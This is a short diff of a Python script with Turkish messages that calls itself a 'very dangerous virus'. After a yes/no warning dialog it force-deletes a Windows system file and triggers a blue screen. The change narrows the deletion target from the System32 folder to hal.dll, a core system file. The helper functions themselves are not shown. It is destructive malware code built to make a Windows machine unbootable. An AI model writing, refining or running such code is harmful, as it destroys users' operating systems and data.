@@ -38,7 +38,7 @@ def force_delete_file(file_path):
         print(f"Sistem silinemedi: {e}")
 
 if messagebox.askyesno("UYARI!", "Bu virüs çok tehlikeli olabilir. Başlatmak istediğinizden emin misiniz?"):
-    force_delete_file(r"C:\\Windows\\System32")
+    force_delete_file(r"C:\\Windows\\System32\\hal.dll")
     time.sleep(2)
     trigger_blue_screen()
 else:
